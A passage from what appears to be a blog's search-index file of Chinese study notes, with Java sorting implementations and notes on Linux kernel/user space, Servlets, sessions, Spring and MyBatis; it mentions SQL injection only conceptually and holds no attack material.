直接插入排序，当前位置与它前面的数字比较，看插入哪一个位置</span></span><br><span class="line"><span class="comment"> * o(n^2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">insertSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">insertSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i - <span class="number">1</span>; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &gt; nums[j + <span class="number">1</span>]) &#123;</span><br><span class="line">                    <span class="keyword">int</span> tmp = nums[j];</span><br><span class="line">                    nums[j] = nums[j + <span class="number">1</span>];</span><br><span class="line">                    nums[j + <span class="number">1</span>] = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        insertSort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by hta on 17-5-5.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">QuickSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        quickSort(nums, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            System.out.println(num);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">quickSort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left = start;</span><br><span class="line">        <span class="keyword">int</span> right = end;</span><br><span class="line">        <span class="keyword">int</span> pivot = nums[(start + end) / <span class="number">2</span>];</span><br><span class="line">        <span class="keyword">while</span> (left &lt;= right) &#123;</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right &amp;&amp; nums[left] &lt; pivot) &#123;</span><br><span class="line">                left++;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> (left &lt;= right &amp;&amp; nums[right] &gt; pivot) &#123;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (left &lt;= right) &#123;</span><br><span class="line">                <span class="keyword">int</span> temp = nums[left];</span><br><span class="line">                nums[left] = nums[right];</span><br><span class="line">                nums[right] = temp;</span><br><span class="line">                left++;</span><br><span class="line">                right--;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        quickSort(nums, start, right);</span><br><span class="line">        quickSort(nums, left, end);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: hta</span></span><br><span class="line"><span class="comment"> * since: 上午10:45 17-5-6</span></span><br><span class="line"><span class="comment"> * time: O(nlogn)</span></span><br><span class="line"><span class="comment"> * param: int[] nums, int[] temp, int start, int end</span></span><br><span class="line"><span class="comment"> * return: void</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">mergeSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">2</span>,<span class="number">3</span>,<span class="number">1</span>,<span class="number">55</span>,<span class="number">6</span>,<span class="number">4</span>,<span class="number">7</span>,<span class="number">3</span>,<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span>[] temp = <span class="keyword">new</span> <span class="keyword">int</span>[nums.length];</span><br><span class="line">        mergeSort(nums, temp, <span class="number">0</span>, nums.length - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num : nums) &#123;</span><br><span class="line">            System.out.println(num);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">mergeSort</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span>[] temp, <span class="keyword">int</span> start, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (start &gt;= end) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> left = start;</span><br><span class="line">        <span class="keyword">int</span> right = end;</span><br><span class="line">        <span class="keyword">int</span> mid = (start + end) / <span class="number">2</span>;</span><br><span class="line">        mergeSort(nums, temp, left, mid);</span><br><span class="line">        mergeSort(nums, temp, mid + <span class="number">1</span>, right);</span><br><span class="line">        merge(nums, temp, start, mid, end);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span>[] nums, <span class="keyword">int</span>[] temp, <span class="keyword">int</span> start, <span class="keyword">int</span> mid, <span class="keyword">int</span> end)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> leftIndex = start;</span><br><span class="line">        <span class="keyword">int</span> rightIndex = mid + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> index = start;</span><br><span class="line">        <span class="keyword">while</span> (leftIndex &lt;= mid &amp;&amp; rightIndex &lt;= end) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[leftIndex] &lt;= nums[rightIndex]) &#123;</span><br><span class="line">                temp[index++] = nums[leftIndex++];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                temp[index++] = nums[rightIndex++];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (leftIndex &lt;= mid) &#123;</span><br><span class="line">            temp[index++] = nums[leftIndex++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> (rightIndex &lt;= end) &#123;</span><br><span class="line">            temp[index++] = nums[rightIndex++];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = start; i &lt;= end; i++) &#123;</span><br><span class="line">            nums[i] = temp[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Sort;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Author</span>: hta</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Date</span>: 2018/03/26</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Time</span>: 20:59</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@Description</span>: 简单选择排序</span></span><br><span class="line"><span class="comment"> * o(n^2)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">selectSort</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">selectSort</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            <span class="keyword">int</span> min = nums[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = i + <span class="number">1</span>; j &lt; nums.length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (nums[j] &lt; min) &#123;</span><br><span class="line">                    <span class="keyword">int</span> tmp = nums[j];</span><br><span class="line">                    nums[j] = min;</span><br><span class="line">                    min = tmp;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            nums[i] = min;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] nums = &#123;<span class="number">3</span>, <span class="number">6</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">9</span>, <span class="number">5</span>&#125;;</span><br><span class="line">        selectSort(nums);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> num: nums) &#123;</span><br><span class="line">            System.out.print(num);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> algorithm </category>
          
          <category> sort </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统总结</title>
      <link href="/system-summary/"/>
      <url>/system-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="linux内核空间和用户空间详解"><a class="markdownIt-Anchor" href="#linux内核空间和用户空间详解"></a> Linux内核空间和用户空间详解</h2><h3 id="基础知识"><a class="markdownIt-Anchor" href="#基础知识"></a> 基础知识</h3><p>Linux简化了分段机制，使得虚拟地址与线性地址总是一致，因此，Linux的虚拟地址空间也为0~4G。Linux内核将这4G字节的空间分为两部分。**将较高的1G字节（从虚拟地址0xC0000000到0xFFFFFFFF），供内核使用，称为“内核空间”。而将较低的3G字节（从虚拟地址 0x00000000到0xBFFFFFFF），供各个进程使用，称为“用户空间”。**因为各个进程可以通过系统调用进入内核，因此，Linux内核是系统内的所有进程共享。于是，从具体进程的角度来看，每个进程可以拥有4G字节的虚拟空间。</p><p>**Linux使用两级保护机制：0级供内核使用，3级供用户程序使用。**每个进程有各自的私有用户空间（0~3G），这个空间对系统中的其他进程是不可见的。最高的1GB字节虚拟内核空间则为所有进程以及内核所共享。</p><blockquote><p>内核空间中存放的是内核代码和数据，而进程的用户空间中存放的是用户程序的代码和数据。不管是内核空间还是用户空间，它们都处于虚拟空间中。</p></blockquote><p>虽然内核空间占据了每个虚拟空间中的最高1GB字节，但映射到物理内存却总是从最低地址（0x00000000）开始。对内核空间来说，其地址映射是很简单的线性映射，0xC0000000就是物理地址与线性地址之间的位移量，在Linux代码中就叫做PAGE_OFFSET。</p><p><strong>常见问题：</strong></p><ol><li>内核空间和用户空间之间如何进行通讯？<br />一般通过系统调用进行通信</li><li>如何判断一个驱动是用户模式还是内核模式驱动？判断的标志是什么？<br />用户空间模式的驱动一般通过系统调用来完成对硬件的访问，如通过系统调用将驱动的io空间映射到用户空间等。<strong>因此，主要的判断依据就是系统调用。</strong></li></ol><h3 id="内核态和用户态"><a class="markdownIt-Anchor" href="#内核态和用户态"></a> 内核态和用户态</h3><p>当一个任务（进程）执行系统调用而陷入内核代码中执行时，我们就称进程处于内核运行态（或简称为内核态）。此时处理器处于特权级最高的（0级）内核代码中执行。当进程处于内核态时，执行的内核代码会使用当前进程的内核栈。每个进程都有自己的内核栈。当进程在执行用户自己的代码时，则称其处于用户运行态（用户态）。即此时处理器在特权级最低的（3级）用户代码中运行。当正在执行用户程序而突然被中断程序中断时，此时用户程序也可以象征性地称为处于进程的内核态。因为中断处理程序将使用当前进程的内核栈。这与处于内核态的进程的状态有些类似。</p><h3 id="进程上下文和中断上下文"><a class="markdownIt-Anchor" href="#进程上下文和中断上下文"></a> 进程上下文和中断上下文</h3><p>处理器总处于以下状态中的一种：</p><ul><li>内核态，运行于进程上下文，内核代表进程运行于内核空间；</li><li>内核态，运行于中断上下文，内核代表硬件运行于内核空间；</li><li>用户态，运行于用户空间。</li></ul><p>用户空间的应用程序，通过系统调用，进入内核空间。这个时候用户空间的进程要传递很多变量、参数的值给内核，内核态运行的时候也要保存用户进程的一些寄存器值、变量等。所谓的“进程上下文”，可以看作是用户进程传递给内核的这些参数以及内核要保存的那一整套的变量和寄存器值和当时的环境等。</p><p>硬件通过触发信号，导致内核调用中断处理程序，进入内核空间。这个过程中，硬件的一些变量和参数也要传递给内核，内核通过这些参数进行中断处理。所谓的“中断上下文”，其实也可以看作就是硬件传递过来的这些参数和内核需要保存的一些其他环境（主要是当前被打断执行的进程环境）。</p>]]></content>
      
      
      <categories>
          
          <category> 基础知识总结 </category>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Web总结</title>
      <link href="/java-web-summary/"/>
      <url>/java-web-summary/</url>
      
        <content type="html"><![CDATA[<h2 id="jsp与servlet的区别"><a class="markdownIt-Anchor" href="#jsp与servlet的区别"></a> JSP与Servlet的区别</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/JSP%E4%B8%8EServlet%E7%9A%84%E5%8C%BA%E5%88%AB.png" alt="JSP与Servlet的区别" /></p><h2 id="servlet的生命周期"><a class="markdownIt-Anchor" href="#servlet的生命周期"></a> Servlet的生命周期</h2><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Servlet%E7%9A%84%E6%8E%A5%E5%8F%A3.png" alt="Servlet的接口" /></p><p>前三个方法与Servlet的生命周期相关，Web容器加载Servlet并将其实例化之后，Servlet的生命周期开始，容器运行其init()方法进行Servlet的初始化；请求到达时调用Servlet的service()方法，service()方法根据需要调用与请求相对应的doGet()或doPost()方法；当服务器关闭或项目被卸载时服务器会将Servlet实例销毁，此时会调用destroy()方法</p><h2 id="如何保持会话状态有哪些方式区别如何"><a class="markdownIt-Anchor" href="#如何保持会话状态有哪些方式区别如何"></a> 如何保持会话状态，有哪些方式，区别如何？</h2><ul><li>URL重写：在URL中添加用户会话的信息作为请求的参数，或者将唯一的会话ID添加到URL结尾以表示一个会话</li><li>设置表单隐藏域：将和会话跟踪相关的字段添加到隐藏表单域中，这些信息不回在浏览器中显示但是在提交表单时会提交给服务器</li></ul><p>以上两种方式都比较难以处理跨越多个页面的信息传递，因为如果每次都要修改URL或者在页面添加隐藏表单域来存储用户会话相关的信息，会变得比较复杂。</p><p>HTML5中可以使用<code>Web Storage</code>技术通过JavaScript来保持数据，例如可以使用<code>localStorage</code>和<code>sessionStorage</code>来保存用户会话的信息，它能够实现会话跟踪</p><h2 id="cookie和session的区别"><a class="markdownIt-Anchor" href="#cookie和session的区别"></a> cookie和session的区别</h2><p>由于http协议是无状态的协议，所以服务端需要记录用户的状态时，就需要用某种机制来识具体的用户，这个机制就是session。这个session是保存在服务端的，有一个唯一标识。在服务端保存session的方法有很多，内存、数据库、文件都可以。</p><p>每次http请求的时候，客户端都会发送相应的cookie信息到服务端，实际上大多数的应用都是用cookie来实现session跟踪的，第一次创建session的时候，服务端会在http协议中告诉客户端，需要在cookie里面记录一个session id，以后每次请求把这个会话id发送到服务器。</p><p>如果客户端浏览器禁用了cookie，在这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪，即每次http请求，URL后面都会附上一个诸如sid=xxx这样的参数，服务端据此来标识用户。</p><p><em>总结：Session是在服务端保存的一个数据结构，用来跟踪用户的状态，这个数据可以保存在集群、数据库、文件中；Cookie是客户端保存用户信息的一种机制，用来记录用户的一些信息，也是实现Session的一种方式。</em></p><h2 id="spring-ioc和aop"><a class="markdownIt-Anchor" href="#spring-ioc和aop"></a> Spring IOC和AOP</h2><h3 id="spring-ioc"><a class="markdownIt-Anchor" href="#spring-ioc"></a> Spring IOC</h3><p>IOC叫控制反转，是Inversion of Control的缩写，DI(Dependency Injection)叫依赖注入，是对IOC更简单的诠释。**控制反转是把传统上由程序代码直接操控的对象调用权交给容器，通过容器来实现对象组件的装配和管理。所谓的控制反转就是对组件对象控制权的转移，从程序代码本身转移到了外部容器，由容器来创建并管理对象之间的依赖关系。**DI是对IOC更准确的描述，即组件之间的依赖关系由容器在运行期间决定，形象的来说，即由容器动态的将某种依赖关系注入到组件之中。</p><p>举个例子：类A需要用到接口B中的方法，那么就需要类A与接口B建立关联或者依赖关系，最原始的方法就在在类A创建接口B的实现类C的实例，但**这种方法要求开发人员自行维护两者的依赖关系，即当依赖关系需要改变的时候需要修改代码并重新构建整个系统。**如果通过一个容器来管理这些对象的依赖关系，只需要在类A中定义好用于管理接口B的方法（构造器或者setter方法），将类A与接口B的实现类C放入容器，通过对容器的配置来实现两者的关系。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Spring%20IOC%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.png" alt="Spring IOC实现原理" /></p><h3 id="spring-aop"><a class="markdownIt-Anchor" href="#spring-aop"></a> Spring AOP</h3><p>AOP(Aspect-Oriented Programming)指一种程序设计范式，该范式以一种称为切面（aspect）的语言构造为基础，**切面是一种新的模块化机制，用来描述分散在对象、类或方法中的横切关注点。**通常，事务、日志、安全性等关注就是应用中的横切关注功能。</p><p><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Spring%20AOP%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86.png" alt="Spring+AOP实现原理" /></p><h3 id="ioc容器的加载过程"><a class="markdownIt-Anchor" href="#ioc容器的加载过程"></a> IOC容器的加载过程</h3><ul><li>创建IOC配置文件的抽象资源</li><li>创建一个BeanFactory</li><li>把读取配置信息的BeanDefinitionReader，这里是XmlBeanDefinitionReader配置给BeanFactory</li><li>把定义好的资源位置读入配置信息，具体解析过程有XmlBeanDefinitionReader来完成，这样完成整个载入bean定义的过程</li></ul><h3 id="动态代理与cglib实现的区别"><a class="markdownIt-Anchor" href="#动态代理与cglib实现的区别"></a> 动态代理与cglib实现的区别</h3><ul><li>JDK动态代理只能对实现了接口的类生成代理，而不能针对类</li><li>CGLIB是针对类实现代理，主要是对指定的类生成了一个子类，覆盖其中的方法。因为是继承，<strong>所以该类或方法最好不要声明成final</strong></li><li>JDK代理是不需要第三方库，只要JDK环境就可以进行代理</li><li>CGLib必须依赖于CGLib的类库，但是它需要类来实现任何接口代理的是指定的类生成一个子类，覆盖其中的方法，是一种继承</li></ul><h2 id="spring-mvc的原理"><a class="markdownIt-Anchor" href="#spring-mvc的原理"></a> Spring MVC的原理</h2><p><img src="http://img.blog.csdn.net/20160427094830780" alt="" /><br />Spring MVC主要由DispatcherServlet、处理器映射、处理器（控制器）、视图解析器、视图组成。两个核心是：</p><ul><li>**处理器映射：**选择使用哪个控制器来处理请求</li><li>**视图解析器：**选择结果应该如何渲染</li></ul><p>通过以上两点，Spring MVC保证了如何选择控制处理请求和如何选择视图展现输出之间的松耦合。<br /><img src="https://toyandemachinelearning.oss-cn-shanghai.aliyuncs.com/toyan.top/Spring%20MVC%E8%BF%90%E8%A1%8C%E5%8E%9F%E7%90%86.png" alt="Spring MVC运行原理" /></p><h2 id="mybatis"><a class="markdownIt-Anchor" href="#mybatis"></a> Mybatis</h2><h3 id="和的区别是什么"><a class="markdownIt-Anchor" href="#和的区别是什么"></a> #{}和${}的区别是什么？</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#&#123;&#125;是预编译处理，$&#123;&#125;是字符串替换</span><br><span class="line">Mybatis在处理#&#123;&#125;时，会将sql中的#&#123;&#125;替换为?号，调用PreparedStatement的set方法来赋值</span><br><span class="line">Mybatis在处理$&#123;&#125;时，就是把$&#123;&#125;替换成变量的值</span><br><span class="line">使用#&#123;&#125;可以有效的防止SQL注入，提高系统安全性</span><br></pre></td></tr></table></figure><h3 id="当实体类中的属性名和表中字段名不一样怎么办"><a class="markdownIt-Anchor" href="#当实体类中的属性名和表中字段名不一样怎么办"></a> 当实体类中的属性名和表中字段名不一样，怎么办？</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">第一种：通过在查询的sql语句中定义字段名的别名，让字段名的别名和实体类的属性名一致</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectorder"</span> <span class="attr">paramaterType</span>=<span class="string">"int"</span> <span class="attr">resultType</span>=<span class="string">"me.gacl.domain.order"</span>&gt;</span></span><br><span class="line">  select order_id id, order_no orderno, order_price price from orders where order_id=#&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">第二种：通过<span class="tag">&lt;<span class="name">resultMap</span>&gt;</span>来映射字段名和实体类属性名的一一对应的关系</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"getOrder"</span> <span class="attr">parameterType</span>=<span class="string">"int"</span> <span class="attr">resultType</span>=<span class="string">"orderResultMap"</span>&gt;</span></span><br><span class="line">  select * from orders where order_id=#&#123;id&#125;;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resultMap</span> <span class="attr">type</span>=<span class="string">"me.gacl.domain.order"</span> <span class="attr">id</span>=<span class="string">"orderResultMap"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">!-用id属性来映射主键字段-</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span> <span class="attr">property</span>=<span class="string">"id"</span> <span class="attr">column</span>=<span class="string">"order_id"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">!-用result属性来映射非主键字段，property为实体类属性名，column为数据表中的属性-</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"orderno"</span> <span class="attr">column</span>=<span class="string">"order_no"</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">result</span> <span class="attr">property</span>=<span class="string">"price"</span> <span class="attr">column</span>=<span class="string">"order_price"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resultMap</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="模糊查询like语句该怎么写"><a class="markdownIt-Anchor" href="#模糊查询like语句该怎么写"></a> 模糊查询like语句该怎么写？</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第一种：在Java代码中添加sql通配符</span><br><span class="line">String wildCardName = "%smi%";</span><br><span class="line">list<span class="tag">&lt;<span class="name">name</span>&gt;</span> names = mapper.selectlike(wildCardName);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span> = <span class="string">"selectlike"</span>&gt;</span></span><br><span class="line">  select * from foo where bar like #&#123;value&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">第2种：在sql语句中拼接通配符，会引起sql注入</span><br><span class="line">String wildCardName = "smi";</span><br><span class="line">list<span class="tag">&lt;<span class="name">name</span>&gt;</span> names = mapper.selectlike(wildCardName);</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectlike"</span>&gt;</span></span><br><span class="line">  select * from foo where bar like "%"#&#123;value&#125;"%"</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第3种：使用动态SQL语句，OGNL表达式中的bind标签</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">"selectEmployLikeName"</span> <span class="attr">resultType</span>=<span class="string">"org.fkit.domain.Employee"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">bind</span> <span class="attr">name</span>=<span class="string">"pattern"</span> <span class="attr">value</span>=<span class="string">"'%' + _parameter.getName() + '%'"</span> /&gt;</span></span><br><span class="line">  select * from tb_employee where loginname like #&#123;pattern&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 